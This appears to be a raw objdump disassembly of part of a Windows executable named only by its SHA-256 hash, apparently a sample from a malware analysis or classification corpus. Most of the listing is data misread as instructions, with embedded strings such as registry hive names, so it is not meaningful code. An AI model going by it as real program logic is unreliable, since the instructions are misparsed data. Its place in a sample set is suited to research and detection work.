
42fd07c963c0e20be60de897497fb7783eb25f09480d9a03ea3d462182b08a74.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	pusha  
  401005:	outs   dx,DWORD PTR ds:[esi]
  401006:	inc    eax
  401007:	add    BYTE PTR [eax+0x1c],dh
  40100a:	inc    eax
  40100b:	add    BYTE PTR [eax-0x3fffbfe4],dl
  401011:	sbb    al,0x40
  401013:	add    al,dh
  401015:	sbb    al,0x40
  401017:	add    BYTE PTR [eax],ah
  401019:	sbb    al,0x40
	...
  401023:	add    BYTE PTR [eax-0x4fffbf92],dl
  401029:	jne    0x40106b
  40102b:	add    BYTE PTR [eax],al
  40102d:	add    BYTE PTR [eax],al
  40102f:	add    BYTE PTR [eax],ah
  401031:	sbb    al,0x0
  401033:	add    BYTE PTR [eax+0x1c],dh
  401036:	add    BYTE PTR [eax],al
  401038:	nop
  401039:	sbb    al,0x0
  40103b:	add    al,al
  40103d:	sbb    al,0x0
  40103f:	add    al,dh
  401041:	sbb    al,0x0
  401043:	add    BYTE PTR [eax],dl
  401045:	sbb    eax,0x1dd00000
  40104a:	add    BYTE PTR [eax],al
  40104c:	inc    eax
  40104d:	and    BYTE PTR [eax],al
  40104f:	add    BYTE PTR [eax+0x20],ah
  401052:	add    BYTE PTR [eax],al
  401054:	loopne 0x401076
  401056:	add    BYTE PTR [eax],al
  401058:	adc    BYTE PTR [ecx],ah
  40105a:	add    BYTE PTR [eax],al
  40105c:	inc    eax
  40105d:	and    DWORD PTR [eax],eax
  40105f:	add    BYTE PTR [eax-0x3fffffde],dl
  401065:	and    al,BYTE PTR [eax]
  401067:	add    al,dl
  401069:	and    al,BYTE PTR [eax]
  40106b:	add    al,ah
  40106d:	and    eax,DWORD PTR [eax]
  40106f:	add    BYTE PTR [eax-0x5fffffda],dl
  401075:	add    BYTE PTR es:[eax],al
  401078:	mov    al,0x26
  40107a:	add    BYTE PTR [eax],al
  40107c:	shl    BYTE PTR [esi],0x0
  40107f:	add    BYTE PTR [eax+0x27],al
  401082:	add    BYTE PTR [eax],al
  401084:	nop
  401085:	daa    
  401086:	add    BYTE PTR [eax],al
  401088:	mov    al,ds:0xc0000029
  40108d:	sub    DWORD PTR [eax],eax
  40108f:	add    al,ah
  401091:	sub    DWORD PTR [eax],eax
  401093:	add    al,dh
  401095:	sub    DWORD PTR [eax],eax
  401097:	add    BYTE PTR [eax],al
  401099:	sub    al,BYTE PTR [eax]
  40109b:	add    al,al
  40109d:	sub    al,BYTE PTR [eax]
  40109f:	add    BYTE PTR [eax],dh
  4010a1:	sub    eax,0x45000000
  4010a6:	add    BYTE PTR [eax],al
  4010a8:	lock inc esi
  4010aa:	add    BYTE PTR [eax],al
  4010ac:	mov    al,ds:0xf000004a
  4010b1:	dec    edx
  4010b2:	add    BYTE PTR [eax],al
  4010b4:	ror    BYTE PTR [eax+eax*1+0x0],1
  4010b8:	loopne 0x401106
  4010ba:	add    BYTE PTR [eax],al
  4010bc:	lock dec esp
  4010be:	add    BYTE PTR [eax],al
  4010c0:	add    BYTE PTR [ebp+0x0],cl
  4010c3:	add    BYTE PTR [eax],dl
  4010c5:	dec    ebp
  4010c6:	add    BYTE PTR [eax],al
  4010c8:	and    BYTE PTR [ebp+0x0],cl
  4010cb:	add    BYTE PTR [eax],dh
  4010cd:	dec    ebp
  4010ce:	add    BYTE PTR [eax],al
  4010d0:	inc    eax
  4010d1:	dec    ebp
  4010d2:	add    BYTE PTR [eax],al
  4010d4:	push   eax
  4010d5:	dec    ebp
  4010d6:	add    BYTE PTR [eax],al
  4010d8:	inc    eax
  4010d9:	push   edi
  4010da:	add    BYTE PTR [eax],al
  4010dc:	rcl    BYTE PTR [edi+0x0],0x0
  4010e0:	lock push edi
  4010e2:	add    BYTE PTR [eax],al
  4010e4:	pusha  
  4010e5:	pop    eax
  4010e6:	add    BYTE PTR [eax],al
  4010e8:	jo     0x401142
  4010ea:	add    BYTE PTR [eax],al
  4010ec:	sbb    BYTE PTR [eax+0x0],0x0
  4010f0:	rcr    BYTE PTR [eax+0x0],1
  4010f3:	add    al,dh
  4010f5:	pop    eax
  4010f6:	add    BYTE PTR [eax],al
  4010f8:	and    BYTE PTR [ecx+0x0],bl
  4010fb:	add    BYTE PTR [eax+0x59],dh
  4010fe:	add    BYTE PTR [eax],al
  401100:	nop
  401101:	pop    ecx
  401102:	add    BYTE PTR [eax],al
  401104:	rcr    BYTE PTR [edi+0x0],1
  401107:	add    BYTE PTR [eax-0x3fffffa0],ah
  40110d:	pusha  
  40110e:	add    BYTE PTR [eax],al
  401110:	loopne 0x401172
  401112:	add    BYTE PTR [eax],al
  401114:	adc    BYTE PTR [ebp+0x0],ah
  401117:	add    BYTE PTR [eax+0x67],al
  40111a:	add    BYTE PTR [eax],al
  40111c:	and    BYTE PTR [eax+0x0],ch
  40111f:	add    BYTE PTR [eax-0x4fffff98],ah
  401125:	imul   eax,DWORD PTR [eax],0x6a9000
  40112b:	add    BYTE PTR [eax],dl
  40112d:	imul   eax,DWORD PTR [eax],0x0
  401130:	nop
  401131:	outs   dx,BYTE PTR ds:[esi]
  401132:	add    BYTE PTR [eax],al
  401134:	pusha  
  401135:	outs   dx,DWORD PTR ds:[esi]
  401136:	add    BYTE PTR [eax],al
  401138:	loopne 0x4011ab
  40113a:	add    BYTE PTR [eax],al
  40113c:	lock jno 0x40113f
  40113f:	add    al,ah
  401141:	jb     0x401143
  401143:	add    BYTE PTR [eax],dh
  401145:	jne    0x401147
  401147:	add    BYTE PTR [eax+0x75],ah
  40114a:	add    BYTE PTR [eax],al
  40114c:	mov    al,0x75
  40114e:	add    BYTE PTR [eax],al
  401150:	nop
  401151:	jbe    0x401153
  401153:	add    BYTE PTR [eax],ah
  401155:	jns    0x401157
  401157:	add    BYTE PTR [eax+0x79],dl
  40115a:	add    BYTE PTR [eax],al
  40115c:	add    BYTE PTR [ebx+0x0],bh
  40115f:	add    BYTE PTR [eax],ah
  401161:	jnp    0x401163
  401163:	add    BYTE PTR [eax+0x7b],al
  401166:	add    BYTE PTR [eax],al
  401168:	pusha  
  401169:	jnp    0x40116b
  40116b:	add    BYTE PTR [eax+0x7b],dh
  40116e:	add    BYTE PTR [eax],al
  401170:	mov    al,ds:0xf0004080
  401175:	add    BYTE PTR [eax+0x0],0x49
  401179:	outs   dx,BYTE PTR ds:[esi]
  40117a:	jbe    0x4011dd
  40117c:	ins    BYTE PTR es:[edi],dx
  40117d:	imul   esp,DWORD PTR [eax+eiz*1+0x70],0x6d617261
  401185:	gs je  0x4011ed
  401188:	jb     0x4011aa
  40118a:	jo     0x4011ed
  40118c:	jae    0x401201
  40118e:	gs and BYTE PTR fs:[edi+ebp*2+0x20],dh
  401194:	inc    ebx
  401195:	and    BYTE PTR [edx+0x75],dh
  401198:	outs   dx,BYTE PTR ds:[esi]
  401199:	je     0x401204
  40119b:	ins    DWORD PTR es:[edi],dx
  40119c:	and    BYTE PTR gs:[esi+0x75],ah
  4011a0:	outs   dx,BYTE PTR ds:[esi]
  4011a1:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  4011a5:	outs   dx,BYTE PTR ds:[esi]
  4011a6:	or     al,BYTE PTR cs:[eax]
  4011a9:	add    BYTE PTR [eax],al
  4011ab:	add    BYTE PTR [ebx+0x0],al
  4011ae:	dec    esp
  4011af:	add    BYTE PTR [ebx+0x0],dl
  4011b2:	dec    ecx
  4011b3:	add    BYTE PTR [eax+eax*1+0x0],al
  4011b7:	add    BYTE PTR [ecx+0x0],al
  4011ba:	jo     0x4011bc
  4011bc:	jo     0x4011be
  4011be:	dec    ecx
  4011bf:	add    BYTE PTR [eax+eax*1+0x0],al
  4011c3:	add    BYTE PTR [ebx+0x0],dl
  4011c6:	add    BYTE PTR [eax],al
  4011c8:	dec    ebp
  4011c9:	add    BYTE PTR [eax],al
  4011cb:	add    BYTE PTR [eax+eax*1+0x0],al
  4011cf:	add    BYTE PTR [edx+0x0],al
  4011d2:	add    BYTE PTR [eax],al
  4011d4:	push   esi
  4011d5:	add    BYTE PTR [ecx+0x0],ah
  4011d8:	ins    BYTE PTR es:[edi],dx
  4011d9:	add    BYTE PTR [eax],al
  4011db:	add    BYTE PTR [esi+0x0],al
  4011de:	outs   dx,DWORD PTR ds:[esi]
  4011df:	add    BYTE PTR [edx+0x0],dh
  4011e2:	arpl   WORD PTR [eax],ax
  4011e4:	add    BYTE PTR gs:[edx+0x0],dl
  4011e8:	add    BYTE PTR gs:[ebp+0x0],ch
  4011ec:	outs   dx,DWORD PTR ds:[esi]
  4011ed:	add    BYTE PTR [esi+0x0],dh
  4011f0:	add    BYTE PTR gs:[eax],al
  4011f3:	add    BYTE PTR [esi+0x0],cl
  4011f6:	outs   dx,DWORD PTR ds:[esi]
  4011f7:	add    BYTE PTR [edx+0x0],dl
  4011fa:	add    BYTE PTR gs:[ebp+0x0],ch
  4011fe:	outs   dx,DWORD PTR ds:[esi]
  4011ff:	add    BYTE PTR [esi+0x0],dh
  401202:	add    BYTE PTR gs:[eax],al
  401205:	add    BYTE PTR [eax],al
  401207:	add    BYTE PTR [eax+eax*1+0x65],al
  40120b:	add    BYTE PTR [eax+eax*1+0x65],ch
  40120f:	add    BYTE PTR [eax+eax*1+0x65],dh
  401213:	add    BYTE PTR [eax],al
  401215:	add    BYTE PTR [eax],al
  401217:	add    BYTE PTR [ebx+0x0],al
  40121a:	outs   dx,DWORD PTR ds:[esi]
  40121b:	add    BYTE PTR [ebp+0x0],ch
  40121e:	jo     0x401220
  401220:	outs   dx,DWORD PTR ds:[esi]
  401221:	add    BYTE PTR [esi+0x0],ch
  401224:	add    BYTE PTR gs:[esi+0x0],ch
  401228:	je     0x40122a
  40122a:	and    BYTE PTR [eax],al
  40122c:	inc    ebx
  40122d:	add    BYTE PTR [ecx+0x0],ah
  401230:	je     0x401232
  401232:	add    BYTE PTR gs:[edi+0x0],ah
  401236:	outs   dx,DWORD PTR ds:[esi]
  401237:	add    BYTE PTR [edx+0x0],dh
  40123a:	imul   eax,DWORD PTR [eax],0x730065
  401240:	add    BYTE PTR [eax],al
  401242:	add    BYTE PTR [eax],al
  401244:	inc    esi
  401245:	add    BYTE PTR [ecx+0x0],ch
  401248:	ins    BYTE PTR es:[edi],dx
  401249:	add    BYTE PTR [ebp+0x0],ah
  40124c:	push   esp
  40124d:	add    BYTE PTR [ecx+0x0],bh
  401250:	jo     0x401252
  401252:	add    BYTE PTR gs:[eax],al
  401255:	add    BYTE PTR [eax],al
  401257:	add    BYTE PTR [ecx+0x0],cl
  40125a:	outs   dx,BYTE PTR ds:[esi]
  40125b:	add    BYTE PTR [eax+eax*1+0x65],dh
  40125f:	add    BYTE PTR [edx+0x0],dh
  401262:	data16 add BYTE PTR [ecx+0x0],ah
  401266:	arpl   WORD PTR [eax],ax
  401268:	add    BYTE PTR gs:[eax],al
  40126b:	add    BYTE PTR [eax+0x0],cl
  40126e:	popa   
  40126f:	add    BYTE PTR [edx+0x0],dh
  401272:	add    BYTE PTR fs:[edi+0x0],dh
  401276:	popa   
  401277:	add    BYTE PTR [edx+0x0],dh
  40127a:	add    BYTE PTR gs:[eax],al
  40127d:	add    BYTE PTR [eax],al
  40127f:	add    BYTE PTR [ebp+0x0],cl
  401282:	imul   eax,DWORD PTR [eax],0x65006d
  401288:	add    BYTE PTR [eax],al
  40128a:	add    BYTE PTR [eax],al
  40128c:	push   ebx
  40128d:	add    BYTE PTR [ecx+0x0],al
  401290:	dec    ebp
  401291:	add    BYTE PTR [eax],al
  401293:	add    BYTE PTR [ebx+0x0],dl
  401296:	inc    ebp
  401297:	add    BYTE PTR [ebx+0x0],al
  40129a:	push   ebp
  40129b:	add    BYTE PTR [edx+0x0],dl
  40129e:	dec    ecx
  40129f:	add    BYTE PTR [eax+eax*1+0x59],dl
  4012a3:	add    BYTE PTR [eax],al
  4012a5:	add    BYTE PTR [eax],al
  4012a7:	add    BYTE PTR [ebx+0x0],dl
  4012aa:	pop    ecx
  4012ab:	add    BYTE PTR [ebx+0x0],dl
  4012ae:	push   esp
  4012af:	add    BYTE PTR [ebp+0x0],al
  4012b2:	dec    ebp
  4012b3:	add    BYTE PTR [eax],al
  4012b5:	add    BYTE PTR [eax],al
  4012b7:	add    BYTE PTR [ebx+0x0],dl
  4012ba:	outs   dx,DWORD PTR ds:[esi]
  4012bb:	add    BYTE PTR [esi+0x0],ah
  4012be:	je     0x4012c0
  4012c0:	ja     0x4012c2
  4012c2:	popa   
  4012c3:	add    BYTE PTR [edx+0x0],dh
  4012c6:	add    BYTE PTR gs:[eax],al
  4012c9:	add    BYTE PTR [eax],al
  4012cb:	add    BYTE PTR [eax+eax*1+0x79],dl
  4012cf:	add    BYTE PTR [eax+0x0],dh
  4012d2:	add    BYTE PTR gs:[eax+eax*1+0x69],cl
  4012d7:	add    BYTE PTR [edx+0x0],ah
  4012da:	add    BYTE PTR [eax],al
  4012dc:	and    eax,DWORD PTR [ebx]
  4012de:	add    BYTE PTR [eax],al
  4012e0:	add    BYTE PTR [eax],al
  4012e2:	add    BYTE PTR [eax],al
  4012e4:	rol    BYTE PTR [eax],0x0
  4012e7:	add    BYTE PTR [eax],al
  4012e9:	add    BYTE PTR [eax],al
  4012eb:	inc    esi
  4012ec:	mov    eax,0xac004011
  4012f1:	adc    DWORD PTR [eax+0x0],eax
  4012f4:	sbb    BYTE PTR [edx],dl
  4012f6:	inc    eax
  4012f7:	add    BYTE PTR [edx+edx*1+0x40],al
  4012fb:	add    BYTE PTR [eax+0x12],bl
  4012fe:	inc    eax
  4012ff:	add    BYTE PTR [edx+edx*1+0x40],ch
  401303:	add    BYTE PTR [eax-0x73ffbfee],al
  401309:	adc    al,BYTE PTR [eax+0x0]
  40130c:	xchg   esp,eax
  40130d:	adc    al,BYTE PTR [eax+0x0]
  401310:	test   al,0x12
  401312:	inc    eax
  401313:	add    BYTE PTR [eax-0x33ffbfee],bh
  401319:	adc    al,BYTE PTR [eax+0x0]
  40131c:	loopne 0x40133e
  40131e:	inc    eax
  40131f:	add    BYTE PTR [eax+0x20],al
  401322:	inc    eax
  401323:	add    BYTE PTR [eax+0x20],ah
  401326:	inc    eax
  401327:	add    BYTE PTR [eax-0xfffbfb6],ah
  40132d:	dec    edx
  40132e:	inc    eax
  40132f:	add    BYTE PTR [eax],dl
  401331:	sbb    eax,0x21100040
  401336:	inc    eax
  401337:	add    al,ah
  401339:	and    eax,DWORD PTR [eax+0x0]
  40133c:	shl    BYTE PTR [edx],0x40
  40133f:	add    al,al
  401341:	sub    DWORD PTR [eax+0x0],eax
  401344:	loopne 0x40136f
  401346:	inc    eax
  401347:	add    al,dh
  401349:	sub    DWORD PTR [eax+0x0],eax
  40134c:	xor    BYTE PTR ds:0x2ac00040,ch
  401352:	inc    eax
  401353:	add    BYTE PTR [eax],al
  401355:	sub    al,BYTE PTR [eax+0x0]
  401358:	rcr    BYTE PTR ds:0x26900040,1
  40135e:	inc    eax
  40135f:	add    BYTE PTR [eax-0x4fffbfda],ah
  401365:	es inc eax
  401367:	add    al,al
  401369:	es inc eax
  40136b:	add    BYTE PTR [eax+0x27],al
  40136e:	inc    eax
  40136f:	add    BYTE PTR [eax-0x6fffbfd9],dl
  401375:	daa    
  401376:	inc    eax
  401377:	add    BYTE PTR [eax+0x4029],ah
  40137d:	inc    ebp
  40137e:	inc    eax
  40137f:	add    al,dl
  401381:	sbb    eax,0x26900040
  401386:	inc    eax
  401387:	add    BYTE PTR [eax-0x4fffbfde],dl
  40138d:	es inc eax
  40138f:	add    al,al
  401391:	es inc eax
  401393:	add    BYTE PTR [eax+0x27],al
  401396:	inc    eax
  401397:	add    BYTE PTR [eax-0x6fffbfd9],dl
  40139d:	daa    
  40139e:	inc    eax
  40139f:	add    BYTE PTR [eax+0x4029],ah
  4013a5:	inc    ebp
  4013a6:	inc    eax
  4013a7:	add    BYTE PTR [eax],dh
  4013a9:	jne    0x4013eb
  4013ab:	add    BYTE PTR [eax],dh
  4013ad:	jne    0x4013ef
  4013af:	add    BYTE PTR [eax],dh
  4013b1:	jne    0x4013f3
  4013b3:	add    BYTE PTR [eax-0xfffbfb6],ah
  4013b9:	dec    edx
  4013ba:	inc    eax
  4013bb:	add    BYTE PTR [eax],dl
  4013bd:	sbb    eax,0x46f00040
  4013c2:	inc    eax
  4013c3:	add    al,ah
  4013c5:	and    eax,DWORD PTR [eax+0x0]
  4013c8:	shl    BYTE PTR [edx],0x40
  4013cb:	add    al,ah
  4013cd:	dec    esp
  4013ce:	inc    eax
  4013cf:	add    BYTE PTR [eax+0x4d],dl
  4013d2:	inc    eax
  4013d3:	add    BYTE PTR [eax],dl
  4013d5:	dec    ebp
  4013d6:	inc    eax
  4013d7:	add    BYTE PTR [eax-0x2fffbf98],ah
  4013dd:	dec    esp
  4013de:	inc    eax
  4013df:	add    BYTE PTR [eax],dh
  4013e1:	dec    ebp
  4013e2:	inc    eax
  4013e3:	add    BYTE PTR [eax],al
  4013e5:	dec    ebp
  4013e6:	inc    eax
  4013e7:	add    BYTE PTR [eax+0x40004069],dh
  4013ed:	dec    ebp
  4013ee:	inc    eax
  4013ef:	add    BYTE PTR [eax],ah
  4013f1:	dec    ebp
  4013f2:	inc    eax
  4013f3:	add    al,dh
  4013f5:	dec    esp
  4013f6:	inc    eax
  4013f7:	add    BYTE PTR [eax],dl
  4013f9:	gs inc eax
  4013fb:	add    al,dl
  4013fd:	pop    edi
  4013fe:	inc    eax
  4013ff:	add    BYTE PTR [eax-0x3fffbfa0],ah
  401405:	pusha  
  401406:	inc    eax
  401407:	add    BYTE PTR [eax+0x67],al
  40140a:	inc    eax
  40140b:	add    al,ah
  40140d:	pusha  
  40140e:	inc    eax
  40140f:	add    BYTE PTR [eax],ah
  401411:	push   0x6b100040
  401416:	inc    eax
  401417:	add    BYTE PTR [eax+0x57],al
  40141a:	inc    eax
  40141b:	add    al,al
  40141d:	push   edi
  40141e:	inc    eax
  40141f:	add    al,dh
  401421:	push   edi
  401422:	inc    eax
  401423:	add    BYTE PTR [eax+0x58],ah
  401426:	inc    eax
  401427:	add    BYTE PTR [eax+0x58],dh
  40142a:	inc    eax
  40142b:	add    BYTE PTR [eax-0x2fffbfa8],al
  401431:	pop    eax
  401432:	inc    eax
  401433:	add    al,dh
  401435:	pop    eax
  401436:	inc    eax
  401437:	add    BYTE PTR [eax],ah
  401439:	pop    ecx
  40143a:	inc    eax
  40143b:	add    BYTE PTR [eax+0x59],dh
  40143e:	inc    eax
  40143f:	add    BYTE PTR [eax+0x6d004059],dl
  401445:	add    BYTE PTR [esi+0x0],ah
  401448:	add    BYTE PTR gs:[edx+0x0],dh
  40144c:	jb     0x40144e
  40144e:	outs   dx,DWORD PTR ds:[esi]
  40144f:	add    BYTE PTR [edx+0x0],dh
  401452:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  401457:	add    BYTE PTR [eax+eax*1+0x0],ch
	...
  40146b:	add    BYTE PTR [ecx+0x6a43c3d2],ch
  401471:	push   esi
  401472:	nop
  401473:	dec    edi
  401474:	mov    ah,0x8c
  401476:	jb     0x401496
  401478:	add    BYTE PTR [edx+0x146c8de],ch
  40147e:	add    BYTE PTR [eax],al
  401480:	add    BYTE PTR [eax],al
  401482:	add    BYTE PTR [eax],al
  401484:	rol    BYTE PTR [eax],0x0
  401487:	add    BYTE PTR [eax],al
  401489:	add    BYTE PTR [eax],al
  40148b:	inc    esi
  40148c:	inc    ecx
  40148d:	add    BYTE PTR [eax+0x0],dl
  401490:	push   eax
  401491:	add    BYTE PTR [ecx+0x0],cl
  401494:	inc    esp
  401495:	add    BYTE PTR [eax],al
  401497:	add    BYTE PTR [ebp+0x0],cl
  40149a:	outs   dx,DWORD PTR ds:[esi]
  40149b:	add    BYTE PTR [eax+eax*1+0x75],ah
  40149f:	add    BYTE PTR [eax+eax*1+0x65],ch
  4014a3:	add    BYTE PTR [eax],al
  4014a5:	add    BYTE PTR [eax],al
  4014a7:	add    BYTE PTR [ebp+0x0],cl
  4014aa:	outs   dx,DWORD PTR ds:[esi]
  4014ab:	add    BYTE PTR [eax+eax*1+0x75],ah
  4014af:	add    BYTE PTR [eax+eax*1+0x65],ch
  4014b3:	add    BYTE PTR [edi+0x0],bl
  4014b6:	push   edx
  4014b7:	add    BYTE PTR [ecx+0x0],ah
  4014ba:	ja     0x4014bc
  4014bc:	add    BYTE PTR [eax],al
  4014be:	add    BYTE PTR [eax],al
  4014c0:	push   edx
  4014c1:	add    BYTE PTR [ebp+0x0],al
  4014c4:	inc    edi
  4014c5:	add    BYTE PTR [ecx+0x0],cl
  4014c8:	push   ebx
  4014c9:	add    BYTE PTR [eax+eax*1+0x52],dl
  4014cd:	add    BYTE PTR [ecx+0x0],bl
  4014d0:	add    BYTE PTR [eax],al
  4014d2:	add    BYTE PTR [eax],al
  4014d4:	dec    eax
  4014d5:	add    BYTE PTR [ebx+0x0],cl
  4014d8:	inc    ebx
  4014d9:	add    BYTE PTR [edx+0x0],dl
  4014dc:	add    BYTE PTR [eax],al
  4014de:	add    BYTE PTR [eax],al
  4014e0:	dec    eax
  4014e1:	add    BYTE PTR [ebx+0x0],cl
  4014e4:	inc    ebx
  4014e5:	add    BYTE PTR [ebp+0x0],dl
  4014e8:	add    BYTE PTR [eax],al
  4014ea:	add    BYTE PTR [eax],al
  4014ec:	dec    eax
  4014ed:	add    BYTE PTR [ebx+0x0],cl
  4014f0:	dec    esp
  4014f1:	add    BYTE PTR [ebp+0x0],cl
  4014f4:	add    BYTE PTR [eax],al
  4014f6:	add    BYTE PTR [eax],al
  4014f8:	dec    eax
  4014f9:	add    BYTE PTR [ebx+0x0],cl
  4014fc:	push   ebp
  4014fd:	add    BYTE PTR [eax],al
  4014ff:	add    BYTE PTR [eax+0x0],cl
  401502:	dec    ebx
  401503:	add    BYTE PTR [eax+0x0],dl
  401506:	inc    esp
  401507:	add    BYTE PTR [eax],al
  401509:	add    BYTE PTR [eax],al
  40150b:	add    BYTE PTR [eax+0x0],cl
  40150e:	dec    ebx
  40150f:	add    BYTE PTR [eax+eax*1+0x44],al
  401513:	add    BYTE PTR [eax],al
  401515:	add    BYTE PTR [eax],al
  401517:	add    BYTE PTR [eax+0x0],cl
  40151a:	dec    ebx
  40151b:	add    BYTE PTR [ebx+0x0],al
  40151e:	inc    ebx
  40151f:	add    BYTE PTR [eax],al
  401521:	add    BYTE PTR [eax],al
  401523:	add    BYTE PTR [eax+0x0],cl
  401526:	dec    ebx
  401527:	add    BYTE PTR [ebp+0x0],al
  40152a:	pop    ecx
  40152b:	add    BYTE PTR [edi+0x0],bl
  40152e:	inc    ebx
  40152f:	add    BYTE PTR [eax+eax*1+0x41],cl
  401533:	add    BYTE PTR [ebx+0x0],dl
  401536:	push   ebx
  401537:	add    BYTE PTR [ebp+0x0],al
  40153a:	push   ebx
  40153b:	add    BYTE PTR [edi+0x0],bl
  40153e:	push   edx
  40153f:	add    BYTE PTR [edi+0x0],cl
  401542:	dec    edi
  401543:	add    BYTE PTR [eax+eax*1+0x0],dl
  401547:	add    BYTE PTR [eax+0x0],cl
  40154a:	dec    ebx
  40154b:	add    BYTE PTR [ebp+0x0],al
  40154e:	pop    ecx
  40154f:	add    BYTE PTR [edi+0x0],bl
  401552:	inc    ebx
  401553:	add    BYTE PTR [ebp+0x0],dl
  401556:	push   edx
  401557:	add    BYTE PTR [edx+0x0],dl
  40155a:	inc    ebp
  40155b:	add    BYTE PTR [esi+0x0],cl
  40155e:	push   esp
  40155f:	add    BYTE PTR [edi+0x0],bl
  401562:	push   ebp
  401563:	add    BYTE PTR [ebx+0x0],dl
  401566:	inc    ebp
  401567:	add    BYTE PTR [edx+0x0],dl
  40156a:	add    BYTE PTR [eax],al
  40156c:	dec    eax
  40156d:	add    BYTE PTR [ebx+0x0],cl
  401570:	inc    ebp
  401571:	add    BYTE PTR [ecx+0x0],bl
  401574:	pop    edi
  401575:	add    BYTE PTR [eax+eax*1+0x4f],cl
  401579:	add    BYTE PTR [ebx+0x0],al
  40157c:	inc    ecx
  40157d:	add    BYTE PTR [eax+eax*1+0x5f],cl
  401581:	add    BYTE PTR [ebp+0x0],cl
  401584:	inc    ecx
  401585:	add    BYTE PTR [ebx+0x0],al
  401588:	dec    eax
  401589:	add    BYTE PTR [ecx+0x0],cl
  40158c:	dec    esi
  40158d:	add    BYTE PTR [ebp+0x0],al
  401590:	add    BYTE PTR [eax],al
  401592:	add    BYTE PTR [eax],al
  401594:	dec    eax
  401595:	add    BYTE PTR [ebx+0x0],cl
  401598:	inc    ebp
  401599:	add    BYTE PTR [ecx+0x0],bl
  40159c:	pop    edi
  40159d:	add    BYTE PTR [ebp+0x0],dl
  4015a0:	push   ebx
  4015a1:	add    BYTE PTR [ebp+0x0],al
  4015a4:	push   edx
  4015a5:	add    BYTE PTR [ebx+0x0],dl
  4015a8:	add    BYTE PTR [eax],al
  4015aa:	add    BYTE PTR [eax],al
  4015ac:	dec    eax
  4015ad:	add    BYTE PTR [ebx+0x0],cl
  4015b0:	inc    ebp
  4015b1:	add    BYTE PTR [ecx+0x0],bl
  4015b4:	pop    edi
  4015b5:	add    BYTE PTR [eax+0x0],dl
  4015b8:	inc    ebp
  4015b9:	add    BYTE PTR [edx+0x0],dl
  4015bc:	inc    esi
  4015bd:	add    BYTE PTR [edi+0x0],cl
  4015c0:	push   edx
  4015c1:	add    BYTE PTR [ebp+0x0],cl
  4015c4:	inc    ecx
  4015c5:	add    BYTE PTR [esi+0x0],cl
  4015c8:	inc    ebx
  4015c9:	add    BYTE PTR [ebp+0x0],al
  4015cc:	pop    edi
  4015cd:	add    BYTE PTR [eax+eax*1+0x41],al
  4015d1:	add    BYTE PTR [eax+eax*1+0x41],dl
  4015d5:	add    BYTE PTR [eax],al
  4015d7:	add    BYTE PTR [eax+0x0],cl
  4015da:	dec    ebx
  4015db:	add    BYTE PTR [ebp+0x0],al
  4015de:	pop    ecx
  4015df:	add    BYTE PTR [edi+0x0],bl
  4015e2:	inc    esp
  4015e3:	add    BYTE PTR [ecx+0x0],bl
  4015e6:	dec    esi
  4015e7:	add    BYTE PTR [edi+0x0],bl
  4015ea:	inc    esp
  4015eb:	add    BYTE PTR [ecx+0x0],al
  4015ee:	push   esp
  4015ef:	add    BYTE PTR [ecx+0x0],al
  4015f2:	add    BYTE PTR [eax],al
  4015f4:	dec    eax
  4015f5:	add    BYTE PTR [ebx+0x0],cl
  4015f8:	inc    ebp
  4015f9:	add    BYTE PTR [ecx+0x0],bl
  4015fc:	pop    edi
  4015fd:	add    BYTE PTR [ebx+0x0],al
  401600:	push   ebp
  401601:	add    BYTE PTR [edx+0x0],dl
  401604:	push   edx
  401605:	add    BYTE PTR [ebp+0x0],al
  401608:	dec    esi
  401609:	add    BYTE PTR [eax+eax*1+0x5f],dl
  40160d:	add    BYTE PTR [ebx+0x0],al
  401610:	dec    edi
  401611:	add    BYTE PTR [esi+0x0],cl
  401614:	inc    esi
  401615:	add    BYTE PTR [ecx+0x0],cl
  401618:	inc    edi
  401619:	add    BYTE PTR [eax],al
  40161b:	add    BYTE PTR [eax],al
  40161d:	add    BYTE PTR [eax],al
  40161f:	add    ah,dl
  401621:	adc    al,0x40
  401623:	add    BYTE PTR [eax],al
  401625:	add    BYTE PTR [eax],al
  401627:	and    al,0x14
  40162a:	inc    eax
  40162b:	add    BYTE PTR [ecx],al
  40162d:	add    BYTE PTR [eax],al
  40162f:	sub    ah,0x14
  401632:	inc    eax
  401633:	add    BYTE PTR [edx],al
  401635:	add    BYTE PTR [eax],al
  401637:	cmp    al,0x14
  40163a:	inc    eax
  40163b:	add    BYTE PTR [ebx],al
  40163d:	add    BYTE PTR [eax],al
  40163f:	add    BYTE PTR [eax],0x15
  401642:	inc    eax
  401643:	add    BYTE PTR [eax+eax*1],al
  401646:	add    BYTE PTR [eax+0x40150c],al
  40164c:	push   es
  40164d:	add    BYTE PTR [eax],al
  40164f:	sbb    BYTE PTR [eax],0x15
  401652:	inc    eax
  401653:	add    BYTE PTR ds:0x24800000,al
  401659:	adc    eax,0x40
  40165e:	add    BYTE PTR [eax+0x401548],al
  401664:	add    DWORD PTR [eax],eax
  401666:	add    BYTE PTR [eax+0x40156c],al
  40166c:	add    al,BYTE PTR [eax]
  40166e:	add    BYTE PTR [eax+0x401594],al
  401674:	add    eax,DWORD PTR [eax]
  401676:	add    BYTE PTR [eax+0x4015ac],al
  40167c:	add    al,0x0
  40167e:	add    BYTE PTR [eax+0x4015d8],al
  401684:	push   es
  401685:	add    BYTE PTR [eax],al
  401687:	xor    ah,0x15
  40168a:	inc    eax
  40168b:	add    BYTE PTR ds:0x41800000,al
  401691:	add    BYTE PTR [eax+0x0],dl
  401694:	dec    ecx
  401695:	add    BYTE PTR ds:0x53004d00,ch
  40169b:	add    BYTE PTR ds:0x69005700,ch
  4016a1:	add    BYTE PTR [esi+0x0],ch
  4016a4:	sub    eax,0x6f004300
  4016a9:	add    BYTE PTR [edx+0x0],dh
  4016ac:	add    BYTE PTR gs:0x6f004c00,ch
  4016b3:	add    BYTE PTR [ebx+0x0],ah
  4016b6:	popa   
  4016b7:	add    BYTE PTR [eax+eax*1+0x52],ch
  4016bb:	add    BYTE PTR [ebp+0x0],ah
  4016be:	add    BYTE PTR [bx+di+0x0],ch
  4016c2:	jae    0x4016c4
  4016c4:	je     0x4016c6
  4016c6:	jb     0x4016c8
  4016c8:	jns    0x4016ca
  4016ca:	sub    eax,0x31004c00
  4016cf:	add    BYTE PTR ds:0x2d003100,ch
  4016d5:	add    BYTE PTR [eax],dh
  4016d7:	add    BYTE PTR [esi],ch
